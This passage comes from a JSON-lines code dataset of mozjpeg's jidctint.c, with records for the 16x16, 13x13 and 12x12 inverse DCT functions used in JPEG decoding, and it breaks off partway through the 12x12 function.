FIX(1.971951411));  /* c1+c5+c13-c7 */\n    z2    += z4;\n    z1    = MULTIPLY(z2, -FIX(0.666655658));       /* -c11 */\n    tmp1  += z1;\n    tmp3  += z1 + MULTIPLY(z4, FIX(1.065388962));  /* c3+c11+c15-c7 */\n    z2    = MULTIPLY(z2, -FIX(1.247225013));       /* -c5 */\n    tmp10 += z2 + MULTIPLY(z4, FIX(3.141271809));  /* c1+c5+c9-c13 */\n    tmp12 += z2;\n    z2    = MULTIPLY(z3 + z4, -FIX(1.353318001));  /* -c3 */\n    tmp2  += z2;\n    tmp3  += z2;\n    z2    = MULTIPLY(z4 - z3, FIX(0.410524528));   /* c13 */\n    tmp10 += z2;\n    tmp11 += z2;\n\n    /* Final output stage */\n\n    wsptr[8 * 0]  = (int)RIGHT_SHIFT(tmp20 + tmp0,  CONST_BITS - PASS1_BITS);\n    wsptr[8 * 15] = (int)RIGHT_SHIFT(tmp20 - tmp0,  CONST_BITS - PASS1_BITS);\n    wsptr[8 * 1]  = (int)RIGHT_SHIFT(tmp21 + tmp1,  CONST_BITS - PASS1_BITS);\n    wsptr[8 * 14] = (int)RIGHT_SHIFT(tmp21 - tmp1,  CONST_BITS - PASS1_BITS);\n    wsptr[8 * 2]  = (int)RIGHT_SHIFT(tmp22 + tmp2,  CONST_BITS - PASS1_BITS);\n    wsptr[8 * 13] = (int)RIGHT_SHIFT(tmp22 - tmp2,  CONST_BITS - PASS1_BITS);\n    wsptr[8 * 3]  = (int)RIGHT_SHIFT(tmp23 + tmp3,  CONST_BITS - PASS1_BITS);\n    wsptr[8 * 12] = (int)RIGHT_SHIFT(tmp23 - tmp3,  CONST_BITS - PASS1_BITS);\n    wsptr[8 * 4]  = (int)RIGHT_SHIFT(tmp24 + tmp10, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 11] = (int)RIGHT_SHIFT(tmp24 - tmp10, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 5]  = (int)RIGHT_SHIFT(tmp25 + tmp11, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 10] = (int)RIGHT_SHIFT(tmp25 - tmp11, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 6]  = (int)RIGHT_SHIFT(tmp26 + tmp12, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 9]  = (int)RIGHT_SHIFT(tmp26 - tmp12, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 7]  = (int)RIGHT_SHIFT(tmp27 + tmp13, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 8]  = (int)RIGHT_SHIFT(tmp27 - tmp13, CONST_BITS - PASS1_BITS);\n  }\n\n  /* Pass 2: process 16 rows from work array, store into output array. */\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < 16; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n\n    /* Even part */\n\n    /* Add fudge factor here for final descale. */\n    tmp0 = (JLONG)wsptr[0] + (ONE << (PASS1_BITS + 2));\n    tmp0 = LEFT_SHIFT(tmp0, CONST_BITS);\n\n    z1 = (JLONG)wsptr[4];\n    tmp1 = MULTIPLY(z1, FIX(1.306562965));      /* c4[16] = c2[8] */\n    tmp2 = MULTIPLY(z1, FIX_0_541196100);       /* c12[16] = c6[8] */\n\n    tmp10 = tmp0 + tmp1;\n    tmp11 = tmp0 - tmp1;\n    tmp12 = tmp0 + tmp2;\n    tmp13 = tmp0 - tmp2;\n\n    z1 = (JLONG)wsptr[2];\n    z2 = (JLONG)wsptr[6];\n    z3 = z1 - z2;\n    z4 = MULTIPLY(z3, FIX(0.275899379));        /* c14[16] = c7[8] */\n    z3 = MULTIPLY(z3, FIX(1.387039845));        /* c2[16] = c1[8] */\n\n    tmp0 = z3 + MULTIPLY(z2, FIX_2_562915447);  /* (c6+c2)[16] = (c3+c1)[8] */\n    tmp1 = z4 + MULTIPLY(z1, FIX_0_899976223);  /* (c6-c14)[16] = (c3-c7)[8] */\n    tmp2 = z3 - MULTIPLY(z1, FIX(0.601344887)); /* (c2-c10)[16] = (c1-c5)[8] */\n    tmp3 = z4 - MULTIPLY(z2, FIX(0.509795579)); /* (c10-c14)[16] = (c5-c7)[8] */\n\n    tmp20 = tmp10 + tmp0;\n    tmp27 = tmp10 - tmp0;\n    tmp21 = tmp12 + tmp1;\n    tmp26 = tmp12 - tmp1;\n    tmp22 = tmp13 + tmp2;\n    tmp25 = tmp13 - tmp2;\n    tmp23 = tmp11 + tmp3;\n    tmp24 = tmp11 - tmp3;\n\n    /* Odd part */\n\n    z1 = (JLONG)wsptr[1];\n    z2 = (JLONG)wsptr[3];\n    z3 = (JLONG)wsptr[5];\n    z4 = (JLONG)wsptr[7];\n\n    tmp11 = z1 + z3;\n\n    tmp1  = MULTIPLY(z1 + z2, FIX(1.353318001));   /* c3 */\n    tmp2  = MULTIPLY(tmp11,   FIX(1.247225013));   /* c5 */\n    tmp3  = MULTIPLY(z1 + z4, FIX(1.093201867));   /* c7 */\n    tmp10 = MULTIPLY(z1 - z4, FIX(0.897167586));   /* c9 */\n    tmp11 = MULTIPLY(tmp11,   FIX(0.666655658));   /* c11 */\n    tmp12 = MULTIPLY(z1 - z2, FIX(0.410524528));   /* c13 */\n    tmp0  = tmp1 + tmp2 + tmp3 -\n            MULTIPLY(z1, FIX(2.286341144));        /* c7+c5+c3-c1 */\n    tmp13 = tmp10 + tmp11 + tmp12 -\n            MULTIPLY(z1, FIX(1.835730603));        /* c9+c11+c13-c15 */\n    z1    = MULTIPLY(z2 + z3, FIX(0.138617169));   /* c15 */\n    tmp1  += z1 + MULTIPLY(z2, FIX(0.071888074));  /* c9+c11-c3-c15 */\n    tmp2  += z1 - MULTIPLY(z3, FIX(1.125726048));  /* c5+c7+c15-c3 */\n    z1    = MULTIPLY(z3 - z2, FIX(1.407403738));   /* c1 */\n    tmp11 += z1 - MULTIPLY(z3, FIX(0.766367282));  /* c1+c11-c9-c13 */\n    tmp12 += z1 + MULTIPLY(z2, FIX(1.971951411));  /* c1+c5+c13-c7 */\n    z2    += z4;\n    z1    = MULTIPLY(z2, -FIX(0.666655658));       /* -c11 */\n    tmp1  += z1;\n    tmp3  += z1 + MULTIPLY(z4, FIX(1.065388962));  /* c3+c11+c15-c7 */\n    z2    = MULTIPLY(z2, -FIX(1.247225013));       /* -c5 */\n    tmp10 += z2 + MULTIPLY(z4, FIX(3.141271809));  /* c1+c5+c9-c13 */\n    tmp12 += z2;\n    z2    = MULTIPLY(z3 + z4, -FIX(1.353318001));  /* -c3 */\n    tmp2  += z2;\n    tmp3  += z2;\n    z2    = MULTIPLY(z4 - z3, FIX(0.410524528));   /* c13 */\n    tmp10 += z2;\n    tmp11 += z2;\n\n    /* Final output stage */\n\n    outptr[0]  = range_limit[(int)RIGHT_SHIFT(tmp20 + tmp0,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[15] = range_limit[(int)RIGHT_SHIFT(tmp20 - tmp0,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[1]  = range_limit[(int)RIGHT_SHIFT(tmp21 + tmp1,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[14] = range_limit[(int)RIGHT_SHIFT(tmp21 - tmp1,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[2]  = range_limit[(int)RIGHT_SHIFT(tmp22 + tmp2,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[13] = range_limit[(int)RIGHT_SHIFT(tmp22 - tmp2,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[3]  = range_limit[(int)RIGHT_SHIFT(tmp23 + tmp3,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[12] = range_limit[(int)RIGHT_SHIFT(tmp23 - tmp3,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[4]  = range_limit[(int)RIGHT_SHIFT(tmp24 + tmp10,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[11] = range_limit[(int)RIGHT_SHIFT(tmp24 - tmp10,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[5]  = range_limit[(int)RIGHT_SHIFT(tmp25 + tmp11,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[10] = range_limit[(int)RIGHT_SHIFT(tmp25 - tmp11,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[6]  = range_limit[(int)RIGHT_SHIFT(tmp26 + tmp12,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[9]  = range_limit[(int)RIGHT_SHIFT(tmp26 - tmp12,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[7]  = range_limit[(int)RIGHT_SHIFT(tmp27 + tmp13,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[8]  = range_limit[(int)RIGHT_SHIFT(tmp27 - tmp13,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n\n    wsptr += 8;         /* advance pointer to next row */\n  }\n}", "path": "mozjpeg/jidctint.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients,\n * producing a 13x13 output block.\n *\n * Optimized algorithm with 29 multiplications in the 1-D kernel.\n * cK represents sqrt(2) * cos(K*pi/26).\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_13x13(j_decompress_ptr cinfo, jpeg_component_info *compptr,\n                JCOEFPTR coef_block, JSAMPARRAY output_buf,\n                JDIMENSION output_col)", "code": "{\n  JLONG tmp10, tmp11, tmp12, tmp13, tmp14, tmp15;\n  JLONG tmp20, tmp21, tmp22, tmp23, tmp24, tmp25, tmp26;\n  JLONG z1, z2, z3, z4;\n  JCOEFPTR inptr;\n  ISLOW_MULT_TYPE *quantptr;\n  int *wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  int workspace[8 * 13];        /* buffers data between passes */\n  SHIFT_TEMPS\n\n  /* Pass 1: process columns from input, store into work array. */\n\n  inptr = coef_block;\n  quantptr = (ISLOW_MULT_TYPE *)compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = 0; ctr < 8; ctr++, inptr++, quantptr++, wsptr++) {\n    /* Even part */\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 0], quantptr[DCTSIZE * 0]);\n    z1 = LEFT_SHIFT(z1, CONST_BITS);\n    /* Add fudge factor here for final descale. */\n    z1 += ONE << (CONST_BITS - PASS1_BITS - 1);\n\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 2], quantptr[DCTSIZE * 2]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 4], quantptr[DCTSIZE * 4]);\n    z4 = DEQUANTIZE(inptr[DCTSIZE * 6], quantptr[DCTSIZE * 6]);\n\n    tmp10 = z3 + z4;\n    tmp11 = z3 - z4;\n\n    tmp12 = MULTIPLY(tmp10, FIX(1.155388986));                /* (c4+c6)/2 */\n    tmp13 = MULTIPLY(tmp11, FIX(0.096834934)) + z1;           /* (c4-c6)/2 */\n\n    tmp20 = MULTIPLY(z2, FIX(1.373119086)) + tmp12 + tmp13;   /* c2 */\n    tmp22 = MULTIPLY(z2, FIX(0.501487041)) - tmp12 + tmp13;   /* c10 */\n\n    tmp12 = MULTIPLY(tmp10, FIX(0.316450131));                /* (c8-c12)/2 */\n    tmp13 = MULTIPLY(tmp11, FIX(0.486914739)) + z1;           /* (c8+c12)/2 */\n\n    tmp21 = MULTIPLY(z2, FIX(1.058554052)) - tmp12 + tmp13;   /* c6 */\n    tmp25 = MULTIPLY(z2, -FIX(1.252223920)) + tmp12 + tmp13;  /* c4 */\n\n    tmp12 = MULTIPLY(tmp10, FIX(0.435816023));                /* (c2-c10)/2 */\n    tmp13 = MULTIPLY(tmp11, FIX(0.937303064)) - z1;           /* (c2+c10)/2 */\n\n    tmp23 = MULTIPLY(z2, -FIX(0.170464608)) - tmp12 - tmp13;  /* c12 */\n    tmp24 = MULTIPLY(z2, -FIX(0.803364869)) + tmp12 - tmp13;  /* c8 */\n\n    tmp26 = MULTIPLY(tmp11 - z2, FIX(1.414213562)) + z1;      /* c0 */\n\n    /* Odd part */\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 1], quantptr[DCTSIZE * 1]);\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 3], quantptr[DCTSIZE * 3]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 5], quantptr[DCTSIZE * 5]);\n    z4 = DEQUANTIZE(inptr[DCTSIZE * 7], quantptr[DCTSIZE * 7]);\n\n    tmp11 = MULTIPLY(z1 + z2, FIX(1.322312651));     /* c3 */\n    tmp12 = MULTIPLY(z1 + z3, FIX(1.163874945));     /* c5 */\n    tmp15 = z1 + z4;\n    tmp13 = MULTIPLY(tmp15, FIX(0.937797057));       /* c7 */\n    tmp10 = tmp11 + tmp12 + tmp13 -\n            MULTIPLY(z1, FIX(2.020082300));          /* c7+c5+c3-c1 */\n    tmp14 = MULTIPLY(z2 + z3, -FIX(0.338443458));    /* -c11 */\n    tmp11 += tmp14 + MULTIPLY(z2, FIX(0.837223564)); /* c5+c9+c11-c3 */\n    tmp12 += tmp14 - MULTIPLY(z3, FIX(1.572116027)); /* c1+c5-c9-c11 */\n    tmp14 = MULTIPLY(z2 + z4, -FIX(1.163874945));    /* -c5 */\n    tmp11 += tmp14;\n    tmp13 += tmp14 + MULTIPLY(z4, FIX(2.205608352)); /* c3+c5+c9-c7 */\n    tmp14 = MULTIPLY(z3 + z4, -FIX(0.657217813));    /* -c9 */\n    tmp12 += tmp14;\n    tmp13 += tmp14;\n    tmp15 = MULTIPLY(tmp15, FIX(0.338443458));       /* c11 */\n    tmp14 = tmp15 + MULTIPLY(z1, FIX(0.318774355)) - /* c9-c11 */\n            MULTIPLY(z2, FIX(0.466105296));          /* c1-c7 */\n    z1    = MULTIPLY(z3 - z2, FIX(0.937797057));     /* c7 */\n    tmp14 += z1;\n    tmp15 += z1 + MULTIPLY(z3, FIX(0.384515595)) -   /* c3-c7 */\n             MULTIPLY(z4, FIX(1.742345811));         /* c1+c11 */\n\n    /* Final output stage */\n\n    wsptr[8 * 0]  = (int)RIGHT_SHIFT(tmp20 + tmp10, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 12] = (int)RIGHT_SHIFT(tmp20 - tmp10, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 1]  = (int)RIGHT_SHIFT(tmp21 + tmp11, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 11] = (int)RIGHT_SHIFT(tmp21 - tmp11, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 2]  = (int)RIGHT_SHIFT(tmp22 + tmp12, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 10] = (int)RIGHT_SHIFT(tmp22 - tmp12, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 3]  = (int)RIGHT_SHIFT(tmp23 + tmp13, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 9]  = (int)RIGHT_SHIFT(tmp23 - tmp13, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 4]  = (int)RIGHT_SHIFT(tmp24 + tmp14, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 8]  = (int)RIGHT_SHIFT(tmp24 - tmp14, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 5]  = (int)RIGHT_SHIFT(tmp25 + tmp15, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 7]  = (int)RIGHT_SHIFT(tmp25 - tmp15, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 6]  = (int)RIGHT_SHIFT(tmp26, CONST_BITS - PASS1_BITS);\n  }\n\n  /* Pass 2: process 13 rows from work array, store into output array. */\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < 13; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n\n    /* Even part */\n\n    /* Add fudge factor here for final descale. */\n    z1 = (JLONG)wsptr[0] + (ONE << (PASS1_BITS + 2));\n    z1 = LEFT_SHIFT(z1, CONST_BITS);\n\n    z2 = (JLONG)wsptr[2];\n    z3 = (JLONG)wsptr[4];\n    z4 = (JLONG)wsptr[6];\n\n    tmp10 = z3 + z4;\n    tmp11 = z3 - z4;\n\n    tmp12 = MULTIPLY(tmp10, FIX(1.155388986));                /* (c4+c6)/2 */\n    tmp13 = MULTIPLY(tmp11, FIX(0.096834934)) + z1;           /* (c4-c6)/2 */\n\n    tmp20 = MULTIPLY(z2, FIX(1.373119086)) + tmp12 + tmp13;   /* c2 */\n    tmp22 = MULTIPLY(z2, FIX(0.501487041)) - tmp12 + tmp13;   /* c10 */\n\n    tmp12 = MULTIPLY(tmp10, FIX(0.316450131));                /* (c8-c12)/2 */\n    tmp13 = MULTIPLY(tmp11, FIX(0.486914739)) + z1;           /* (c8+c12)/2 */\n\n    tmp21 = MULTIPLY(z2, FIX(1.058554052)) - tmp12 + tmp13;   /* c6 */\n    tmp25 = MULTIPLY(z2, -FIX(1.252223920)) + tmp12 + tmp13;  /* c4 */\n\n    tmp12 = MULTIPLY(tmp10, FIX(0.435816023));                /* (c2-c10)/2 */\n    tmp13 = MULTIPLY(tmp11, FIX(0.937303064)) - z1;           /* (c2+c10)/2 */\n\n    tmp23 = MULTIPLY(z2, -FIX(0.170464608)) - tmp12 - tmp13;  /* c12 */\n    tmp24 = MULTIPLY(z2, -FIX(0.803364869)) + tmp12 - tmp13;  /* c8 */\n\n    tmp26 = MULTIPLY(tmp11 - z2, FIX(1.414213562)) + z1;      /* c0 */\n\n    /* Odd part */\n\n    z1 = (JLONG)wsptr[1];\n    z2 = (JLONG)wsptr[3];\n    z3 = (JLONG)wsptr[5];\n    z4 = (JLONG)wsptr[7];\n\n    tmp11 = MULTIPLY(z1 + z2, FIX(1.322312651));     /* c3 */\n    tmp12 = MULTIPLY(z1 + z3, FIX(1.163874945));     /* c5 */\n    tmp15 = z1 + z4;\n    tmp13 = MULTIPLY(tmp15, FIX(0.937797057));       /* c7 */\n    tmp10 = tmp11 + tmp12 + tmp13 -\n            MULTIPLY(z1, FIX(2.020082300));          /* c7+c5+c3-c1 */\n    tmp14 = MULTIPLY(z2 + z3, -FIX(0.338443458));    /* -c11 */\n    tmp11 += tmp14 + MULTIPLY(z2, FIX(0.837223564)); /* c5+c9+c11-c3 */\n    tmp12 += tmp14 - MULTIPLY(z3, FIX(1.572116027)); /* c1+c5-c9-c11 */\n    tmp14 = MULTIPLY(z2 + z4, -FIX(1.163874945));    /* -c5 */\n    tmp11 += tmp14;\n    tmp13 += tmp14 + MULTIPLY(z4, FIX(2.205608352)); /* c3+c5+c9-c7 */\n    tmp14 = MULTIPLY(z3 + z4, -FIX(0.657217813));    /* -c9 */\n    tmp12 += tmp14;\n    tmp13 += tmp14;\n    tmp15 = MULTIPLY(tmp15, FIX(0.338443458));       /* c11 */\n    tmp14 = tmp15 + MULTIPLY(z1, FIX(0.318774355)) - /* c9-c11 */\n            MULTIPLY(z2, FIX(0.466105296));          /* c1-c7 */\n    z1    = MULTIPLY(z3 - z2, FIX(0.937797057));     /* c7 */\n    tmp14 += z1;\n    tmp15 += z1 + MULTIPLY(z3, FIX(0.384515595)) -   /* c3-c7 */\n             MULTIPLY(z4, FIX(1.742345811));         /* c1+c11 */\n\n    /* Final output stage */\n\n    outptr[0]  = range_limit[(int)RIGHT_SHIFT(tmp20 + tmp10,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[12] = range_limit[(int)RIGHT_SHIFT(tmp20 - tmp10,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[1]  = range_limit[(int)RIGHT_SHIFT(tmp21 + tmp11,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[11] = range_limit[(int)RIGHT_SHIFT(tmp21 - tmp11,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[2]  = range_limit[(int)RIGHT_SHIFT(tmp22 + tmp12,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[10] = range_limit[(int)RIGHT_SHIFT(tmp22 - tmp12,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[3]  = range_limit[(int)RIGHT_SHIFT(tmp23 + tmp13,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[9]  = range_limit[(int)RIGHT_SHIFT(tmp23 - tmp13,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[4]  = range_limit[(int)RIGHT_SHIFT(tmp24 + tmp14,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[8]  = range_limit[(int)RIGHT_SHIFT(tmp24 - tmp14,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[5]  = range_limit[(int)RIGHT_SHIFT(tmp25 + tmp15,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[7]  = range_limit[(int)RIGHT_SHIFT(tmp25 - tmp15,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n    outptr[6]  = range_limit[(int)RIGHT_SHIFT(tmp26,\n                                              CONST_BITS + PASS1_BITS + 3) &\n                             RANGE_MASK];\n\n    wsptr += 8;         /* advance pointer to next row */\n  }\n}", "path": "mozjpeg/jidctint.c", "commit_date": "2020-11-05 00:00:00", "repo_name": "mozilla/mozjpeg", "stars": 5317, "license": "other", "language": "c", "size": 14984}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients,\n * producing a 12x12 output block.\n *\n * Optimized algorithm with 15 multiplications in the 1-D kernel.\n * cK represents sqrt(2) * cos(K*pi/24).\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_12x12(j_decompress_ptr cinfo, jpeg_component_info *compptr,\n                JCOEFPTR coef_block, JSAMPARRAY output_buf,\n                JDIMENSION output_col)", "code": "{\n  JLONG tmp10, tmp11, tmp12, tmp13, tmp14, tmp15;\n  JLONG tmp20, tmp21, tmp22, tmp23, tmp24, tmp25;\n  JLONG z1, z2, z3, z4;\n  JCOEFPTR inptr;\n  ISLOW_MULT_TYPE *quantptr;\n  int *wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  int workspace[8 * 12];        /* buffers data between passes */\n  SHIFT_TEMPS\n\n  /* Pass 1: process columns from input, store into work array. */\n\n  inptr = coef_block;\n  quantptr = (ISLOW_MULT_TYPE *)compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = 0; ctr < 8; ctr++, inptr++, quantptr++, wsptr++) {\n    /* Even part */\n\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 0], quantptr[DCTSIZE * 0]);\n    z3 = LEFT_SHIFT(z3, CONST_BITS);\n    /* Add fudge factor here for final descale. */\n    z3 += ONE << (CONST_BITS - PASS1_BITS - 1);\n\n    z4 = DEQUANTIZE(inptr[DCTSIZE * 4], quantptr[DCTSIZE * 4]);\n    z4 = MULTIPLY(z4, FIX(1.224744871)); /* c4 */\n\n    tmp10 = z3 + z4;\n    tmp11 = z3 - z4;\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 2], quantptr[DCTSIZE * 2]);\n    z4 = MULTIPLY(z1, FIX(1.366025404)); /* c2 */\n    z1 = LEFT_SHIFT(z1, CONST_BITS);\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 6], quantptr[DCTSIZE * 6]);\n    z2 = LEFT_SHIFT(z2, CONST_BITS);\n\n    tmp12 = z1 - z2;\n\n    tmp21 = z3 + tmp12;\n    tmp24 = z3 - tmp12;\n\n    tmp12 = z4 + z2;\n\n    tmp20 = tmp10 + tmp12;\n    tmp25 = tmp10 - tmp12;\n\n    tmp12 = z4 - z1 - z2;\n\n    tmp22 = tmp11 + tmp12;\n    tmp23 = tmp11 - tmp12;\n\n    /* Odd part */\n\n    z1 = DEQUANTIZE(inptr[DCTSIZE * 1], quantptr[DCTSIZE * 1]);\n    z2 = DEQUANTIZE(inptr[DCTSIZE * 3], quantptr[DCTSIZE * 3]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE * 5], quantptr[DCTSIZE * 5]);\n    z4 = DEQUANTIZE(inptr[DCTSIZE * 7], quantptr[DCTSIZE * 7]);\n\n    tmp11 = MULTIPLY(z2, FIX(1.306562965));                  /* c3 */\n    tmp14 = MULTIPLY(z2, -FIX_0_541196100);                  /* -c9 */\n\n    tmp10 = z1 + z3;\n    tmp15 = MULTIPLY(tmp10 + z4, FIX(0.860918669));          /* c7 */\n    tmp12 = tmp15 + MULTIPLY(tmp10, FIX(0.261052384));       /* c5-c7 */\n    tmp10 = tmp12 + tmp11 + MULTIPLY(z1, FIX(0.280143716));  /* c1-c5 */\n    tmp13 = MULTIPLY(z3 + z4, -FIX(1.045510580));            /* -(c7+c11) */\n    tmp12 += tmp13 + tmp14 - MULTIPLY(z3, FIX(1.478575242)); /* c1+c5-c7-c11 */\n    tmp13 += tmp15 - tmp11 + MULTIPLY(z4, FIX(1.586706681)); /* c1+c11 */\n    tmp15 += tmp14 - MULTIPLY(z1, FIX(0.676326758)) -        /* c7-c11 */\n             MULTIPLY(z4, FIX(1.982889723));                 /* c5+c7 */\n\n    z1 -= z4;\n    z2 -= z3;\n    z3 = MULTIPLY(z1 + z2, FIX_0_541196100);                 /* c9 */\n    tmp11 = z3 + MULTIPLY(z1, FIX_0_765366865);              /* c3-c9 */\n    tmp14 = z3 - MULTIPLY(z2, FIX_1_847759065);              /* c3+c9 */\n\n    /* Final output stage */\n\n    wsptr[8 * 0]  = (int)RIGHT_SHIFT(tmp20 + tmp10, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 11] = (int)RIGHT_SHIFT(tmp20 - tmp10, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 1]  = (int)RIGHT_SHIFT(tmp21 + tmp11, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 10] = (int)RIGHT_SHIFT(tmp21 - tmp11, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 2]  = (int)RIGHT_SHIFT(tmp22 + tmp12, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 9]  = (int)RIGHT_SHIFT(tmp22 - tmp12, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 3]  = (int)RIGHT_SHIFT(tmp23 + tmp13, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 8]  = (int)RIGHT_SHIFT(tmp23 - tmp13, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 4]  = (int)RIGHT_SHIFT(tmp24 + tmp14, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 7]  = (int)RIGHT_SHIFT(tmp24 - tmp14, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 5]  = (int)RIGHT_SHIFT(tmp25 + tmp15, CONST_BITS - PASS1_BITS);\n    wsptr[8 * 6]  = (int)RIGHT_SHIFT(tmp25 - tmp15, CONST_BITS - PASS1_BITS);\n  }\n\n  /* Pass 2: process 12 rows from work array, store into output array. */\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < 12; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n\n    /* Even part */\n\n    /* Add fudge factor here for final descale. */\n    z3 = (JLONG)wsptr[0] + (ONE << (PASS1_BITS + 2));\n    z3 = LEFT_SHIFT(z3, CONST_BITS);\n\n    z4 = (JLONG)wsptr[4];\n    z4 = MULTIPLY(z4, FIX(1.224744871)); /* c4 */\n\n    tmp10 = z3 + z4;\n    tmp11 = z3 - z4;\n\n    z1 = (JLONG)wsptr[2];\n    z4 = MULTIPLY(z1, FIX(1.366025404)); /* c2 */\n    z1 = LEFT_SHIFT(z1, CONST_BITS);\n    z2 = (JLONG)wsptr[6];\n    z2 = LEFT_SHIFT(z2, CONST_BITS);\n\n    tmp12 = z1 - z2;\n\n    tmp21 = z3 + tmp12;\n    tmp24 = z3 - tmp12;\n\n    tmp12 = z4 + z2;\n\n    tmp20 = tmp10 + tmp12;\n    tmp25 = tmp10 - tmp12;\n\n    tmp12 = z4 - z1 - z2;\n\n    tmp22 = tmp11 + tmp12;\n    tmp23 = tmp11 - tmp12;\n\n    /* Odd part */\n\n    z1 = (JLONG)wsptr[1];\n    z2 = (JLONG)wsptr[3];\n    z3 = (JLONG)wsptr[5];\n    z4 = (JLONG)wsptr[7];\n\n    tmp11 = MULTIPLY(z2, FIX(1.306562965));                  /* c3 */\n    tmp14 = MULTIPLY(z2, -FIX_0_541196100);                  /* -c9 */\n\n    tmp10 = z1 + z3;\n    tmp15 = MULTIPLY(tmp10 + z4, FIX(0.860918669));          /* c7 */\n    tmp12 = tmp15 + MULTIPLY(tmp10, FIX(0.261052384));       /* c5-c7 */\n    tmp10 = tmp12 + tmp11 + MULTIPLY(z1, FIX(0.280143716));  /* c1-c5 */\n    tmp13 = MULTIPLY(z3 + z4, -FIX(1.045510580));            /* -(c7+c11) */\n    tmp12 += tmp13 + tmp14 - MULTIPLY(z3, FIX(1.478575242)); /* c1+c5-c7-c11 */\n    tmp13 += tmp15 - tmp11 + MULTIPLY(z4, FIX(1.586706681)); /* c1+c11 */\n    tmp15 += tmp14 - 